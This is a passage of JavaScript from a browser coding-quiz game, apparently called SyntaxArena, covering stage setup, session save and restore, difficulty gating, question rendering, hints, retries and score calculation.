  6: { id: 6, name: 'Stage 6: Systems Logic', questionsCount: 5, startIndex: 25, endIndex: 30, isBoss: false },
  7: { id: 7, name: 'Stage 7: Advanced Patterns', questionsCount: 5, startIndex: 30, endIndex: 35, isBoss: false },
  8: { id: 8, name: 'Stage 8: 💀 FINAL APEX BOSS', questionsCount: 5, startIndex: 35, endIndex: 40, isBoss: true },
  marathon: { id: 'marathon', name: 'Tier Marathon (20 Qs)', questionsCount: 20, startIndex: 0, endIndex: 20, isBoss: false }
};

var Gameplay = window.Gameplay = {
  engine: null,
  sessionConfig: null,
  timer: {
    intervalId: null,
    timeRemaining: 0,
    timeLimit: 45,
    isRunning: false
  },
  currentSubmission: null,
  selectedOptionIndex: null,
  selectedBugLine: null,
  isSubmitting: false,
  isAdvancing: false,
  isCompleted: false,
  _isRetryAttempt: false,
  _autoAdvanceTimer: null,
  _eventsBound: false,
  _lastSubmitTime: 0,
  _lastAdvanceTime: 0,

  /**
   * Save an atomic snapshot of current session state to reactive state & localStorage.
   */
  _saveSessionSnapshot() {
    if (!this.engine || this.isCompleted) return;
    const sess = this.engine.getSession();
    if (!sess || sess.isCompleted) {
      State.set('activeSession', null, true);
      return;
    }

    const usedHints = this.engine._hintManager ? Array.from(this.engine._hintManager._usedHints || []) : [];

    const snapshot = {
      id: sess.id,
      inProgress: true,
      language: sess.language,
      difficulty: sess.difficulty,
      mode: sess.mode,
      stage: this.activeStage ? this.activeStage.id : 'marathon',
      timeLimit: sess.timeLimit,
      startTime: sess.startTime,
      questionIds: sess.questions.map(q => q.id),
      currentIndex: sess.currentIndex,
      totalScore: sess.totalScore,
      currentStreak: sess.currentStreak,
      highestStreak: sess.highestStreak,
      questionsAttempted: sess.questionsAttempted,
      questionsCorrect: sess.questionsCorrect,
      lives: sess.lives,
      maxLives: sess.maxLives,
      isGameOver: sess.isGameOver,
      hintsUsedCount: sess.hintsUsedCount,
      retriesUsedCount: sess.retriesUsedCount,
      usedHintQuestionIds: usedHints,
      results: [...sess.results],
      lastUpdated: Date.now()
    };

    State.set('activeSession', snapshot, true);
  },

  /**
   * Initialize gameplay arena from URL parameters, storage state, or profile preferences.
   * Restores existing in-progress session if valid and matches requested track.
   */
  async init() {
    try {
      console.info('[Gameplay] Initializing SyntaxArena gameplay interface...');
      this.isCompleted = false;

    // Listen for storage degradation warnings
    Storage.onDegradation(() => {
      UI.showToast('Browser storage is restricted or full. Current run is in-memory only.', 'info');
    });

    // 1. Resolve & sanitize configuration from query params or active profile
    const params = Router.getQueryParams();
    const activeProfile = State.get('activeProfile') || Profile.getActiveProfile();

    const ALLOWED_LANGS = ['python', 'c', 'cpp', 'java', 'cyber', 'javascript', 'rust', 'sql'];
    const ALLOWED_DIFFS = ['beginner', 'intermediate', 'expert'];
    const ALLOWED_MODES = ['campaign', 'practice', 'speedrun', 'hardcore', 'retry_missed'];

    let rawLang = (params.lang || (activeProfile && activeProfile.preferences?.language) || 'python').toLowerCase();
    if (!ALLOWED_LANGS.includes(rawLang)) {
      console.warn(`[Gameplay] Unknown language "${params.lang}". Falling back to Python.`);
      UI.showToast(`Unsupported track "${params.lang}". Loaded Python track.`, 'info');
      rawLang = 'python';
    }
    const language = rawLang;

    let rawDiff = (params.diff || (activeProfile && activeProfile.preferences?.difficulty) || 'beginner').toLowerCase();
    if (!ALLOWED_DIFFS.includes(rawDiff)) {
      console.warn(`[Gameplay] Unknown difficulty "${params.diff}". Falling back to beginner.`);
      rawDiff = 'beginner';
    }

    // STRICT GATING: Ensure intermediate and expert cannot be launched without sufficient points or prior tier clear
    if (rawDiff !== 'beginner') {
      const userXP = (activeProfile && (typeof activeProfile.totalScore === 'number' ? activeProfile.totalScore : activeProfile.xp)) || 0;
      const camp = (activeProfile && activeProfile.campaign && activeProfile.campaign[language]) || {};
      const completed = (activeProfile && activeProfile.completedTiers) || {};

      if (rawDiff === 'intermediate') {
        const isBegCleared = camp.beginnerStars > 0 || camp.unlockedTier === 'intermediate' || camp.unlockedTier === 'expert' || completed[language + '_beginner'];
        if (!isBegCleared && userXP < 1000) {
          console.warn(`[Gameplay] Intermediate tier is locked for ${language}. Reverting to beginner.`);
          UI.showToast(`🔒 Intermediate is locked (requires Beginner clear or 1,000 pts). Switched to Beginner tier.`, 'info');
          rawDiff = 'beginner';
        }
      } else if (rawDiff === 'expert') {
        const isIntCleared = camp.intermediateStars > 0 || camp.unlockedTier === 'expert' || completed[language + '_intermediate'];
        if (!isIntCleared && userXP < 2500) {
          console.warn(`[Gameplay] Expert tier is locked for ${language}. Reverting to beginner.`);
          UI.showToast(`🔒 Expert is locked (requires Intermediate clear or 2,500 pts). Switched to Beginner tier.`, 'info');
          rawDiff = 'beginner';
        }
      }
    }
    const difficulty = rawDiff;

    let rawMode = (params.mode || 'campaign').toLowerCase();
    if (!ALLOWED_MODES.includes(rawMode)) {
      console.warn(`[Gameplay] Unknown mode "${params.mode}". Falling back to campaign.`);
      rawMode = 'campaign';
    }
    const mode = rawMode;

    // Determine time limit: Hardcore (30s), Standard timed (45s), Relaxed (0)
    let timeLimit = 45;
    if (params.timed === 'false' || mode === 'practice') {
      timeLimit = 0; // Relaxed mode
    } else if (mode === 'hardcore') {
      timeLimit = 30;
    } else if (mode === 'speedrun') {
      timeLimit = 20;
    }

    // 2. Check for an active session to restore on reload
    const savedSession = State.get('activeSession');
    const isExplicitNew = params.new === 'true' || params.reset === 'true';
    const canResume = !isExplicitNew &&
      mode !== 'retry_missed' &&
      savedSession &&
      savedSession.inProgress &&
      !savedSession.isGameOver &&
      savedSession.language === language &&
      savedSession.difficulty === difficulty &&
      savedSession.mode === mode &&
      (!params.stage || String(savedSession.stage || 'marathon') === String(params.stage)) &&
      Array.isArray(savedSession.questionIds) &&
      savedSession.questionIds.length > 0 &&
      (Date.now() - (savedSession.lastUpdated || savedSession.startTime || 0)) < 2 * 60 * 60 * 1000;

    if (canResume) {
      const restoredQuestions = savedSession.questionIds
        .map(id => QuestionBank.getById(id))
        .filter(Boolean);

      if (restoredQuestions.length === savedSession.questionIds.length) {
        console.info('[Gameplay] Active in-progress session found. Restoring game engine state...');
        this.engine = new GameEngine();
        this.sessionConfig = {
          language,
          difficulty,
          mode,
          timeLimit: savedSession.timeLimit ?? timeLimit,
          questions: restoredQuestions,
          randomizeOrder: false
        };

        try {
          this.engine.startSession(this.sessionConfig);
          const session = this.engine.getSession();
          session.id = savedSession.id;
          session.currentIndex = Math.min(savedSession.currentIndex || 0, restoredQuestions.length - 1);
          session.totalScore = savedSession.totalScore || 0;
          session.currentStreak = savedSession.currentStreak || 0;
          session.highestStreak = savedSession.highestStreak || 0;
          session.questionsAttempted = savedSession.questionsAttempted || 0;
          session.questionsCorrect = savedSession.questionsCorrect || 0;
          session.hintsUsedCount = savedSession.hintsUsedCount || 0;
          session.retriesUsedCount = savedSession.retriesUsedCount || 0;
          if (typeof savedSession.lives === 'number') {
            session.lives = savedSession.lives;
          }
          if (Array.isArray(savedSession.results)) {
            session.results = [...savedSession.results];
          }
          if (Array.isArray(savedSession.usedHintQuestionIds)) {
            savedSession.usedHintQuestionIds.forEach(id => {
              this.engine._hintManager._usedHints.add(id);
            });
          }

          this.activeStage = STAGE_CONFIG[savedSession.stage] || STAGE_CONFIG.marathon;
          this._bindEvents();
          const resumedQ = this.engine.getCurrentQuestion();
          this.renderQuestion(resumedQ);

          if (this.sessionConfig.timeLimit > 0) {
            this._startTimer(this.sessionConfig.timeLimit);
          } else {
            this._updateTimerDisplay('∞ Relaxed', false);
          }

          UI.updateHeaderProfile();
          UI.showToast(`Resumed in-progress challenge at Question ${session.currentIndex + 1} of ${session.questions.length}.`, 'info');
          return true;
        } catch (restoreErr) {
          console.warn('[Gameplay] Session restoration failed. Clearing active session and starting fresh.', restoreErr);
          State.set('activeSession', null, true);
        }
      }
    }

    // Clean one-time query parameters from browser URL so future reloads restore state cleanly
    if (params.new || params.reset) {
      try {
        const clean = new URL(window.location.href);
        clean.searchParams.delete('new');
        clean.searchParams.delete('reset');
        window.history.replaceState({}, '', clean.toString());
      } catch (_) {}
    }

    // 3. Load questions from QuestionBank with support for Retry Missed and Topic Practice
    let questions = [];

    if (mode === 'retry_missed') {
      let missedIds = [];
      try {
        const cached = sessionStorage.getItem('syntaxarena_retry_question_ids');
        if (cached) missedIds = JSON.parse(cached);
      } catch (e) {}
      if (!Array.isArray(missedIds) || missedIds.length === 0) {
        missedIds = activeProfile ? (activeProfile.missedQuestionIds || []) : [];
      }
      if (Array.isArray(missedIds) && missedIds.length > 0) {
        questions = missedIds
          .map(id => QuestionBank.getById(id))
          .filter(Boolean);
      }
    }

    if (params.topic && questions.length === 0) {
      const tKey = params.topic.toLowerCase().trim();
      const langPool = QuestionBank.getByLanguage(language);
      const topicMatches = langPool.filter(q =>
        (q.topic && q.topic.toLowerCase() === tKey) || (q.subtopic && q.subtopic.toLowerCase() === tKey)
      );
      if (topicMatches.length > 0) {
        questions = topicMatches;
      }
    }

    if (questions.length === 0) {
      questions = QuestionBank.getByDifficulty(language, difficulty);
      if (!questions || questions.length === 0) {
        questions = QuestionBank.getByLanguage(language);
      }
    }

    if (!questions || questions.length === 0) {
      console.error(`[Gameplay] No questions found for language=${language}, difficulty=${difficulty}`);
      UI.showToast('Failed to load challenge questions. Returning to Hub.', 'error');
      setTimeout(() => Router.navigateTo('index'), 2000);
      return false;
    }

    // STAGE SLICING: Support dividing the campaign into 8 Stages of 5 questions each
    let stageParam = params.stage ? String(params.stage).toLowerCase().trim() : 'marathon';
    let activeStage = STAGE_CONFIG[stageParam] || STAGE_CONFIG.marathon;

    if (mode === 'campaign' && stageParam !== 'marathon' && stageParam !== 'all') {
      const parsedStage = parseInt(stageParam, 10);
      if (parsedStage >= 1 && parsedStage <= 8) {
        activeStage = STAGE_CONFIG[parsedStage];
        if (questions.length < activeStage.endIndex) {
          questions = QuestionBank.getByLanguage(language);
        }
        questions = questions.slice(activeStage.startIndex, activeStage.endIndex);
      }
    }
    this.activeStage = activeStage;

    // 4. Initialize GameEngine
    this.engine = new GameEngine();
    this.sessionConfig = {
      language,
      difficulty,
      mode,
      timeLimit,
      questions,
      stage: activeStage.id,
      randomizeOrder: mode !== 'campaign'
    };

    try {
      this.engine.startSession(this.sessionConfig);
    } catch (err) {
      console.error('[Gameplay] Failed to start engine session:', err);
      UI.showToast('Unable to start challenge session.', 'error');
      return false;
    }

    // 5. Update reactive state with active session snapshot
    this._saveSessionSnapshot();

    // 6. Bind DOM controls and keyboard shortcuts
    this._bindEvents();

    // 7. Render first question
    const initialQuestion = this.engine.getCurrentQuestion();
    this.renderQuestion(initialQuestion);

    // 8. Start timer if timed mode
    if (timeLimit > 0) {
      this._startTimer(timeLimit);
    } else {
      this._updateTimerDisplay('∞ Relaxed', false);
    }

    // 9. Update profile header pill
    UI.updateHeaderProfile();

    console.info(`[Gameplay] Session initialized (${language} • ${difficulty} • ${questions.length} questions)`);
    return true;
  } catch (err) {
    console.error('[Gameplay] Critical error during gameplay initialization:', err);
    const promptEl = Utils.qs('#q-prompt-text');
    if (promptEl) {
      promptEl.textContent = 'Unable to initialize gameplay challenge. Please return to the Hub or retry.';
      promptEl.style.color = 'var(--color-danger)';
    }
    const ansContainer = Utils.qs('#answer-interface-container');
    if (ansContainer) {
      ansContainer.innerHTML = `
        <div style="text-align: center; padding: 1.5rem 0;">
          <button class="btn-arcade btn-primary btn-sm" onclick="window.location.reload()">Retry Loading</button>
          <a href="index.html" class="btn-arcade btn-neutral btn-sm" style="margin-left: 0.5rem;">Return to Hub</a>
        </div>
      `;
    }
    UI.showToast('Gameplay initialization failed. Check console for details.', 'error');
    return false;
  }
},

  /**
   * Render question data safely into the DOM.
   * @param {object} q - Current question payload from engine
   */
  renderQuestion(q) {
    if (!q) return;

    this.currentSubmission = null;
    this.selectedOptionIndex = null;
    this.selectedBugLine = null;
    this.isSubmitting = false;
    this.isAdvancing = false;

    if (this._autoAdvanceTimer) {
      clearTimeout(this._autoAdvanceTimer);
      this._autoAdvanceTimer = null;
    }

    // Reset visual feedback containers
    const feedbackPanel = Utils.qs('#feedback-panel');
    const hintDrawer = Utils.qs('#hint-drawer');
    const submitBtn = Utils.qs('#btn-submit-answer');
    const hintBtn = Utils.qs('#btn-use-hint');
    const nextBtn = Utils.qs('#btn-next-question');
    const retryBtn = Utils.qs('#btn-retry-question');

    this._isRetryAttempt = false;

    const arenaCard = Utils.qs('#arena-card');
    if (arenaCard) {
      arenaCard.classList.remove('animate-pop', 'animate-shake', 'animate-question-in');
      void arenaCard.offsetWidth; // Force reflow
      arenaCard.classList.add('animate-question-in');
    }

    if (feedbackPanel) feedbackPanel.style.display = 'none';
    if (hintDrawer) hintDrawer.style.display = 'none';
    if (nextBtn) {
      nextBtn.style.display = 'none';
      nextBtn.disabled = false;
    }
    if (retryBtn) retryBtn.style.display = 'none';

    if (submitBtn) {
      submitBtn.disabled = true;
      submitBtn.textContent = 'Submit Answer';
      submitBtn.style.display = 'inline-flex';
    }

    // Configure hint button (disabled in Hardcore Mode)
    const isHardcore = this.sessionConfig && this.sessionConfig.mode === 'hardcore';
    const penalty = HINT_PENALTIES[q.difficulty] || 25;
    if (hintBtn) {
      if (isHardcore) {
        hintBtn.disabled = true;
        hintBtn.textContent = 'Hints Disabled (Hardcore)';
        hintBtn.style.opacity = '0.5';
      } else if (q.hasUsedHint) {
        hintBtn.disabled = true;
        hintBtn.textContent = 'Hint Activated';
        hintBtn.style.opacity = '0.6';
        if (hintDrawer) {
          const hintText = Utils.qs('#hint-drawer-text');
          if (hintText) hintText.textContent = q.hint || 'Carefully trace the variable assignments step-by-step.';
          hintDrawer.style.display = 'block';
        }
      } else {
        hintBtn.disabled = false;
        hintBtn.textContent = `Use Hint (-${penalty} pts)`;
        hintBtn.style.opacity = '1';
      }
    }

    // Update Hardcore lives if applicable
    this._updateLivesDisplay(q.lives ?? 3, q.maxLives ?? 3);

    // Update HUD: Language, Step Counter, Progress Bar, Streak, Score
    const langMeta = LANGUAGE_METADATA[q.language] || LANGUAGE_METADATA.python;
    const hudLangTag = Utils.qs('#hud-lang-tag');
    if (hudLangTag) {
      hudLangTag.textContent = langMeta.name;
      hudLangTag.className = `tag-lang ${langMeta.tagClass}`;
    }

    const hudStep = Utils.qs('#hud-step-counter');
    if (hudStep) {
      hudStep.textContent = `Question ${q.index + 1} of ${q.totalQuestions}`;
    }

    // Accessible Progress Bar
    const progressFill = Utils.qs('#hud-progress-fill');
    const progressContainer = Utils.qs('#hud-progress-container');
    const progressPercent = Math.round((q.index / q.totalQuestions) * 100);
    if (progressFill) {
      progressFill.style.width = `${progressPercent}%`;
    }
    if (progressContainer) {
      progressContainer.setAttribute('aria-valuenow', String(progressPercent));
    }

    // Streak & Multiplier
    const streakText = Utils.qs('#hud-streak-text');
    const session = this.engine.getSession();
    const streak = session ? session.currentStreak : 0;
    const multiplier = Math.min(1.0 + (streak * 0.25), 3.0).toFixed(2);
    if (streakText) {
      streakText.textContent = `x${multiplier} Streak (${streak}🔥)`;
    }

    // Score
    const scoreDisplay = Utils.qs('#hud-score-display');
    if (scoreDisplay) {
      scoreDisplay.textContent = session ? session.totalScore : 0;
    }

    // Card Header Badges
    const formatBadge = Utils.qs('#q-format-badge');
    if (formatBadge) {
      formatBadge.textContent = this._formatTypeLabel(q.type);
      formatBadge.className = `badge ${this._getTypeBadgeClass(q.type)}`;
    }

    const diffBadge = Utils.qs('#q-diff-badge');
    const questionCard = Utils.qs('.arena-main-card') || Utils.qs('.card');
    if (diffBadge) {
      if (this.activeStage && this.activeStage.isBoss) {
        const bossTitle = this.activeStage.id === 8 ? 'FINAL APEX BOSS' : 'MINI-BOSS STAGE';
        diffBadge.textContent = `${q.difficulty.toUpperCase()} • 💀 ${bossTitle} (Stage ${this.activeStage.id} / 8)`;
        diffBadge.className = 'badge badge-coral boss-pulse';
        if (questionCard) questionCard.classList.add('is-boss');
      } else if (this.activeStage && this.activeStage.id !== 'marathon') {
        diffBadge.textContent = `${q.difficulty.toUpperCase()} • Stage ${this.activeStage.id} / 8`;
        diffBadge.className = `badge ${q.difficulty === 'expert' ? 'badge-coral' : q.difficulty === 'intermediate' ? 'badge-amber' : 'badge-emerald'}`;
        if (questionCard) questionCard.classList.remove('is-boss');
      } else {
        diffBadge.textContent = q.difficulty.toUpperCase();
        diffBadge.className = `badge ${q.difficulty === 'expert' ? 'badge-coral' : q.difficulty === 'intermediate' ? 'badge-amber' : 'badge-emerald'}`;
        if (questionCard) questionCard.classList.remove('is-boss');
      }
    }

    const topicTitle = Utils.qs('#q-topic-title');
    if (topicTitle) {
      const topicStr = (q.topic || 'Logic').replace(/_/g, ' ').toUpperCase();
      const subtopicStr = (q.subtopic || '').replace(/_/g, ' ');
      topicTitle.textContent = subtopicStr ? `${topicStr} • ${subtopicStr}` : topicStr;
    }

    // Prompt Text
    const promptText = Utils.qs('#q-prompt-text');
    if (promptText) {
      promptText.textContent = q.prompt;
    }

    // Code Terminal
    const terminalEl = Utils.qs('#code-terminal-container');
    const filenameEl = Utils.qs('#terminal-filename');
    const versionEl = Utils.qs('#terminal-version');
    const codePre = Utils.qs('#terminal-code-body');

    if (filenameEl) filenameEl.textContent = langMeta.filename;
    if (versionEl) versionEl.textContent = q.standardVersion || langMeta.version;

    if (q.code && q.code.trim()) {
      if (terminalEl) terminalEl.style.display = 'block';
      this._renderCodeSnippet(codePre, q.code, q.type === 'find_bug');
    } else {
      if (terminalEl) terminalEl.style.display = 'none';
    }

    // Render Answer Interface for Question Type
    this._renderAnswerInterface(q);

    // Announce to Screen Readers
    this._announceLive(`Question ${q.index + 1} of ${q.totalQuestions}: ${q.prompt}`);
  },

  /**
   * Safely render code snippet preserving indentation and line numbers.
   * Enables click-to-select for 'find_bug' questions.
   */
  _renderCodeSnippet(container, codeStr, isFindBug = false) {
    if (!container) return;
    container.innerHTML = ''; // Clear previous

    const lines = codeStr.split('\n');
    lines.forEach((lineText, idx) => {
      const lineNum = idx + 1;
      const row = document.createElement('div');
      row.className = isFindBug ? 'code-line is-clickable' : 'code-line';
      row.setAttribute('data-line', String(lineNum));

      if (isFindBug) {
        row.setAttribute('role', 'button');
        row.setAttribute('tabindex', '0');
        row.setAttribute('aria-label', `Line ${lineNum}: ${lineText}`);
        row.onclick = () => this.selectBugLine(lineNum);
        row.onkeydown = (e) => {
          if (e.key === 'Enter' || e.key === ' ') {
            e.preventDefault();
            this.selectBugLine(lineNum);
          }
        };
      }

      const numSpan = document.createElement('span');
      numSpan.className = 'code-line-number';
      numSpan.textContent = String(lineNum).padStart(2, '0');

      const textSpan = document.createElement('span');
      textSpan.className = 'code-line-text';
      textSpan.textContent = lineText;

      row.appendChild(numSpan);
      row.appendChild(textSpan);
      container.appendChild(row);
    });
  },

  /**
   * Render answer input appropriate to question format.
   * @param {object} q
   */
  _renderAnswerInterface(q) {
    const arenaBody = Utils.qs('#answer-interface-container');
    if (!arenaBody) return;
    arenaBody.innerHTML = '';

    const cleanType = String(q.type || '').replace(/-/g, '_');

    switch (cleanType) {
      case 'find_bug':
        this._renderFindBugInterface(arenaBody, q);
        break;

      case 'fill_code':
      case 'complete_code':
        this._renderFillCodeInterface(arenaBody, q);
        break;

      case 'multiple_choice':
      case 'predict_output':
      case 'code_tracing':
      default:
        this._renderMultipleChoiceInterface(arenaBody, q);
        break;
    }
  },

  /**
   * Render Multiple Choice / Predict Output Options Grid.
   */
  _renderMultipleChoiceInterface(container, q) {
    const grid = document.createElement('div');
    grid.className = 'options-grid';
    grid.setAttribute('role', 'radiogroup');
    grid.setAttribute('aria-label', 'Answer choices');

    const letters = ['A', 'B', 'C', 'D', 'E', 'F'];
    const options = q.options || [];

    options.forEach((opt, idx) => {
      const optText = typeof opt === 'object' && opt !== null ? (opt.text || opt.id) : String(opt);
      const letter = letters[idx] || String(idx + 1);

      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = 'option-card';
      btn.setAttribute('role', 'radio');
      btn.setAttribute('aria-checked', 'false');
      btn.setAttribute('data-index', String(idx));
      btn.setAttribute('data-letter', letter);

      const badge = document.createElement('span');
      badge.className = 'option-key-badge';
      badge.textContent = letter;

      const textSpan = document.createElement('span');
      textSpan.style.flex = '1';
      textSpan.textContent = optText;

      btn.appendChild(badge);
      btn.appendChild(textSpan);

      btn.onclick = () => {
        this.selectOption(idx, optText);
      };

      grid.appendChild(btn);
    });

    container.appendChild(grid);

    // If Predict Output, display helpful normalization guideline
    if (q.type.includes('predict')) {
      const helper = document.createElement('div');
      helper.style.fontSize = 'var(--text-xs)';
      helper.style.color = 'var(--text-muted)';
      helper.style.fontStyle = 'italic';
      helper.style.marginBottom = 'var(--space-3)';
      helper.textContent = 'ℹ Select the exact stdout string produced by this program execution.';
      container.appendChild(helper);
    }
  },

  /**
   * Render Find the Bug Interface.
   */
  _renderFindBugInterface(container, q) {
    const bar = document.createElement('div');
    bar.className = 'line-selector-bar';

    const title = document.createElement('span');
    title.className = 'line-selector-title';
    title.textContent = 'Defect Location:';

    const pillsContainer = document.createElement('div');
    pillsContainer.className = 'line-pills-container';

    const lineCount = (q.code || '').split('\n').length;
    for (let i = 1; i <= lineCount; i++) {
      const pill = document.createElement('button');
      pill.type = 'button';
      pill.className = 'line-pill-btn';
      pill.setAttribute('data-line', String(i));
      pill.textContent = `Line ${i}`;

      pill.onclick = () => {
        this.selectBugLine(i);
      };

      pillsContainer.appendChild(pill);
    }

    bar.appendChild(title);
    bar.appendChild(pillsContainer);
    container.appendChild(bar);

    const helpText = document.createElement('div');
    helpText.style.fontSize = 'var(--text-xs)';
    helpText.style.color = 'var(--text-secondary)';
    helpText.style.marginBottom = 'var(--space-4)';
    helpText.textContent = 'Click on the buggy line directly in the code window above or tap a line button.';
    container.appendChild(helpText);
  },

  /**
   * Render Fill the Code Input Field & Token Quick-Picks.
   */
  _renderFillCodeInterface(container, q) {
    const wrap = document.createElement('div');
    wrap.className = 'fill-code-container';

    const label = document.createElement('label');
    label.setAttribute('for', 'fill-code-input');
    label.style.fontSize = 'var(--text-sm)';
    label.style.fontWeight = '700';
    label.style.color = 'var(--text-primary)';
    label.textContent = 'Enter the missing code statement or token:';

    const input = document.createElement('input');
    input.type = 'text';
    input.id = 'fill-code-input';
    input.className = 'fill-code-input';
    input.placeholder = 'Type missing keyword, expression, or identifier...';
    input.autocomplete = 'off';
    input.spellcheck = false;

    input.oninput = (e) => {
      this.inputFillCode(e.target.value);
    };

    input.onkeydown = (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        if (this.currentSubmission) {
          this.submitCurrentAnswer();
        }
      }
    };

    wrap.appendChild(label);
    wrap.appendChild(input);
    container.appendChild(wrap);

    // If options are provided, render token quick-pick chips
    if (Array.isArray(q.options) && q.options.length > 0) {
      const chipsGroup = document.createElement('div');
      chipsGroup.className = 'token-chips-group';

      const chipsLabel = document.createElement('span');
      chipsLabel.style.fontSize = 'var(--text-xs)';
      chipsLabel.style.color = 'var(--text-muted)';
      chipsLabel.textContent = 'Suggested Tokens:';
      chipsGroup.appendChild(chipsLabel);

      q.options.forEach(tok => {
        const chip = document.createElement('button');
        chip.type = 'button';
        chip.className = 'token-chip';
        chip.textContent = tok;
        chip.onclick = () => {
          input.value = tok;
          this.inputFillCode(tok);
          input.focus();
        };
        chipsGroup.appendChild(chip);
      });

      container.appendChild(chipsGroup);
    }

    // Auto-focus the input
    setTimeout(() => input.focus(), 100);
  },

  /**
   * Select a multiple choice or predict output option.
   */
  selectOption(idx, optionText) {
    AudioEngine.playClick();
    this.selectedOptionIndex = idx;
    this.currentSubmission = optionText;

    const cards = Utils.qsa('.option-card');
    cards.forEach((card, i) => {
      if (i === idx) {
        card.classList.add('is-selected');
        card.setAttribute('aria-checked', 'true');
      } else {
        card.classList.remove('is-selected');
        card.setAttribute('aria-checked', 'false');
      }
    });

    const submitBtn = Utils.qs('#btn-submit-answer');
    if (submitBtn) {
      submitBtn.disabled = false;
    }
  },

  /**
   * Select a defective code line for 'find_bug'.
   */
  selectBugLine(lineNum) {
    AudioEngine.playClick();
    this.selectedBugLine = lineNum;
    this.currentSubmission = lineNum;

    // Highlight line in code terminal
    const lines = Utils.qsa('.code-line');
    lines.forEach(row => {
      const rowLine = parseInt(row.getAttribute('data-line'), 10);
      if (rowLine === lineNum) {
        row.classList.add('is-selected-bug');
      } else {
        row.classList.remove('is-selected-bug');
      }
    });

    // Highlight line selector pill
    const pills = Utils.qsa('.line-pill-btn');
    pills.forEach(pill => {
      const pLine = parseInt(pill.getAttribute('data-line'), 10);
      if (pLine === lineNum) {
        pill.classList.add('is-active');
      } else {
        pill.classList.remove('is-active');
      }
    });

    const submitBtn = Utils.qs('#btn-submit-answer');
    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.textContent = `Submit Line ${lineNum}`;
    }
  },

  /**
   * Handle text input in 'fill_code' questions.
   */
  inputFillCode(text) {
    const val = (text || '').trim();
    this.currentSubmission = val;

    const submitBtn = Utils.qs('#btn-submit-answer');
    if (submitBtn) {
      submitBtn.disabled = val.length === 0;
    }
  },

  /**
   * Submit current answer to the GameEngine.
   */
  submitCurrentAnswer() {
    const now = Date.now();
    if (this.isSubmitting || (now - this._lastSubmitTime < 350) || this.currentSubmission === null || this.currentSubmission === undefined) return;
    this.isSubmitting = true;
    this._lastSubmitTime = now;

    // Pause timer while evaluating feedback
    this._stopTimer();

    const submitBtn = Utils.qs('#btn-submit-answer');
    if (submitBtn) submitBtn.disabled = true;

    const timeRemaining = this.timer.timeRemaining;

    let result;
    try {
      result = this.engine.submitAnswer(this.currentSubmission, timeRemaining);
      this._saveSessionSnapshot();
    } catch (err) {
      console.error('[Gameplay] Submission rejected by engine:', err);
      this.isSubmitting = false;
      return;
    }

    const arenaCard = Utils.qs('#arena-card');

    if (result.correct) {
      // Correct Answer Flow
      AudioEngine.playSuccess();
      AudioEngine.playStreak();

      if (arenaCard) {
        arenaCard.classList.remove('animate-shake');
        arenaCard.classList.add('animate-pop');
      }

      if (this._isRetryAttempt) {
        const session = this.engine ? this.engine.getSession() : null;
        if (session) {
          if (result.points > 0) {
            session.totalScore = Math.max(0, session.totalScore - result.points);
          }
          session.currentStreak = 0;
          if (Array.isArray(session.results) && session.results.length > 0) {
            const curRes = session.results[session.results.length - 1];
            if (curRes && curRes.index === session.currentIndex) {
              curRes.points = 0;
              curRes.basePoints = 0;
              curRes.speedBonus = 0;
              curRes.multiplier = 1.0;
              curRes.streak = 0;
              curRes.retried = true;
            }
          }
        }
        result.points = 0;
        result.streak = 0;
      } else {
        // Streak milestone bonuses (3 in a row -> +30 pts, 5 in a row -> +50 pts)
        const session = this.engine ? this.engine.getSession() : null;
        if (session) {
          if (session.currentStreak === 3) {
            session.totalScore += 30;
            result.points += 30;
            UI.showToast('🔥 3-in-a-Row Streak Bonus! +30 Points!', 'success');
          } else if (session.currentStreak === 5) {
            session.totalScore += 50;
            result.points += 50;
            UI.showToast('⚡ 5-in-a-Row Mega Streak Bonus! +50 Points!', 'success');
          }
        }
      }

      let mathMsg = '';
      if (this._isRetryAttempt) {
        mathMsg = 'Score Math: +0 pts (Original attempt counted as incorrect for stage accuracy). Great job learning the answer!';
      } else {
        const base = result.basePoints || (this.sessionConfig && this.sessionConfig.difficulty === 'expert' ? 350 : this.sessionConfig && this.sessionConfig.difficulty === 'intermediate' ? 200 : 100);
        const speed = result.speedBonus || 0;
        const hintPen = result.hintPenalty || 0;
        const mult = (result.multiplier || 1.0).toFixed(2);
        const parts = [`${base} base`];
        if (hintPen > 0) parts.push(`-${hintPen} hint penalty`);
        if (speed > 0) parts.push(`+${speed} speed bonus (${timeRemaining}s left)`);
        mathMsg = `Score Math: (${parts.join(' ')}) × ${mult}x streak = +${result.points} pts`;
      }

      this._displayFeedback({
        type: 'correct',
        title: this._isRetryAttempt ? 'Correct on Retry!' : 'Correct Deduction!',
        points: result.points,
        streak: result.streak,
        explanation: result.explanation,
        message: mathMsg
      });

      // Highlight selected option card in green
      if (this.selectedOptionIndex !== null) {
        const cards = Utils.qsa('.option-card');
        if (cards[this.selectedOptionIndex]) {
          cards[this.selectedOptionIndex].classList.add('is-correct');
        }
      }

      this._announceLive(this._isRetryAttempt
        ? 'Correct answer on retry! 0 points added for retried question.'
        : `Correct answer! +${result.points} points awarded. Current streak: ${result.streak}.`
      );

      // Auto-advance to next question automatically after 2.0s delay
      if (this._autoAdvanceTimer) {
        clearTimeout(this._autoAdvanceTimer);
      }
      this._autoAdvanceTimer = setTimeout(() => {
        this.advanceNextQuestion();
      }, 2000);
    } else {
      // Incorrect Answer Flow
      AudioEngine.playError();

      if (arenaCard) {
        arenaCard.classList.remove('animate-pop');
        arenaCard.classList.add('animate-shake');
      }

      if (result.canRetry) {
        // Second Chance Retry Unlocked
        this._displayFeedback({
          type: 'retry',
          title: 'Second Chance Unlocked!',
          message: 'Your answer is incorrect, but you unlocked a retry because you activated a hint. Review the clue and try again.'
        });

        // Re-enable answer controls for 1 retry
        this.currentSubmission = null;
        if (submitBtn) {
          submitBtn.disabled = true;
          submitBtn.textContent = 'Submit Second Chance Retry';
        }

        // Deselect visual cards
        Utils.qsa('.option-card').forEach(c => c.classList.remove('is-selected'));
        Utils.qsa('.line-pill-btn').forEach(p => p.classList.remove('is-active'));
        Utils.qsa('.code-line').forEach(l => l.classList.remove('is-selected-bug'));

        this._announceLive('Incorrect answer. Second Chance retry unlocked. Review the clue and try again.');
        this.isSubmitting = false;
        return;
      } else {
        // No retry available (or retry failed)
        if (result.gameOver) {
          // Hardcore Game Over
          this._displayFeedback({
            type: 'incorrect',
            title: '💀 GAME OVER — Hearts Depleted',
            correctAnswer: result.correctAnswer,
